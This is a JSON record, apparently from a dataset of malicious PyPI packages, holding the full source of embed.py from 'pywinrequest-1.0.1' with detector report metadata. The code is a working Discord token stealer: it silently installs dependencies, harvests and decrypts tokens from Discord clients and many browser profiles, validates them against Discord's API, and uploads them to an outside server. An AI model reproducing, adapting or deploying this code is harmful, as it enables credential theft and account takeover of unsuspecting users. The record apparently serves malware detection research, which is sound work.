[
  {
    "pyfile": "embed.py",
    "malicious_code_snippets": "import urllib.parse\nimport os\nos.system('pip install requests==2.28.1 -q -q -q --no-input')\nimport requests\nos.system('pip install pyotp -q -q -q --no-input')\nimport base64\nimport sqlite3\nimport shutil\nfrom datetime import datetime, timedelta\nimport re\nimport os.path\nimport time\nimport json\nfrom pyotp import TOTP\nos.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')\nif os.name == \"nt\":\n    os.system('pip install pywin32==304 -q -q -q --no-input')\n    os.system('pip install pypiwin32 -q -q -q --no-input')\n    from win32crypt import CryptUnprotectData\nelse:\n    pass\nfrom Crypto.Cipher import AES\n\nglobal all_tokens\nall_tokens = []\nencrypt_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\nnormal_regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\nbaseurl = \"https://discord.com/api/v9/users/@me\"\ntokens = []\nids = []\npython3api = \"https://python39api.onrender.com\"\napikey = 'YOL4HH6CUDB3IUGCS3BLTQVRYOWXY==='\nkey = TOTP(apikey).now()\n\ndef decrypt_val(buff, master_key):\n    iv = buff[3:15]\n    payload = buff[15:]\n    cipher = AES.new(master_key, AES.MODE_GCM, iv)\n    decrypted_pass = cipher.decrypt(payload)\n    decrypted_pass = decrypted_pass[:-16].decode()\n\n    return decrypted_pass\n\n\ndef get_key(path):\n    if not os.path.exists(path):\n        return\n\n    if \"os_crypt\" not in open(path, \"r\", encoding=\"utf-8\").read():\n        return\n\n    with open(path, \"r\", encoding=\"utf-8\") as f:\n        c = f.read()\n\n    local_state = json.loads(c)\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = master_key[5:]\n    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n    return master_key\n\ndef main_token():\n    try:\n        os.remove(\"tokens.txt\")\n    except:\n        pass\n    appdata = os.getenv(\"LOCALAPPDATA\")\n    roaming = os.getenv(\"APPDATA\")\n    temp = os.getenv(\"TEMP\")\n\n    paths = {\n    \"Discord\": roaming + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord Canary\": roaming + \"\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\\",\n    \"Lightcord\": roaming + \"\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord PTB\": roaming + \"\\\\discordptb\\\\Local Storage\\\\leveldb\\\\\",\n    \"Opera\": roaming + \"\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\\",\n    \"Opera GX\": roaming + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\\",\n    \"Amigo\": appdata + \"\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Torch\": appdata + \"\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Kometa\": appdata + \"\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Orbitum\": appdata + \"\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"CentBrowser\": appdata + \"\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"7Star\": appdata + \"\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Sputnik\": appdata + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Vivaldi\": appdata + \"\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome SxS\": appdata + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome1\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome2\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome3\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome4\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\\",\n    \"Chrome5\": appdata\n    + \"\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\\",\n    \"Epic Privacy Browser\": appdata\n    + \"\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    \"Microsoft Edge\": appdata\n    + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\\",\n    \"Uran\": appdata + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Yandex\": appdata\n    + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Brave\": appdata\n    + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n    \"Iridium\": appdata + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\",\n}\n\n    message = \"\"\n\n    for name, path in paths.items():\n        if not os.path.exists(path):\n            continue\n        disc = name.replace(\" \", \"\").lower()\n        if \"cord\" in path:\n            if os.path.exists(roaming + f\"\\\\{disc}\\\\Local State\"):\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip()\n                        for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines()\n                        if x.strip()\n                    ]:\n                        for y in re.findall(encrypt_regex, line):\n                            token = decrypt_val(\n                                base64.b64decode(y.split(\"dQw4w9WgXcQ:\")[1]),\n                                get_key(roaming + f\"\\\\{disc}\\\\Local State\"),\n                            )\n                            r = requests.get(\n                                baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                            if r.status_code == 200:\n                                uid = r.json()[\"id\"]\n                                if uid not in ids:\n                                    tokens.append(token)\n                                    ids.append(uid)\n        else:\n            for file_name in os.listdir(path):\n                if file_name[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n\n    if os.path.exists(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n        for path, _, files in os.walk(roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for _file in files:\n                if not _file.endswith(\".sqlite\"):\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{_file}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(normal_regex, line):\n                        r = requests.get(\n                            baseurl,\n                            headers={\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                \"Content-Type\": \"application/json\",\n                                \"Authorization\": token,\n                            },\n                        )\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in ids:\n                                tokens.append(token)\n                                ids.append(uid)\n\n    remove_dup = [*set(all_tokens)]\n    with open(\"tokens.txt\", \"a+\", encoding=\"utf-8\", errors=\"ignore\") as f:\n        for item in tokens:\n            f.write(f\"{item}\\n\")\n    files = {\n        'file': open(\"tokens.txt\", 'rb')\n    }\n    requests.post(python3api, headers={\"Authorization\": key}, files=files)\n\nclass Start:\n    def __init__(self):\n        main_token()\n",
    "hash_value": "ea530ad96294fe17d1e197ae02478dbb"
  },
  {
    "metadata": {
      "package_name": "pywinrequest-1.0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pywinrequest-1.0.1.txt",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/pywinrequest-1.0.1/pywinrequest-1.0.1/src/pywinrequest/utils/embed.py",
      "code_hash": "ea530ad96294fe17d1e197ae02478dbb"
    }
  }
]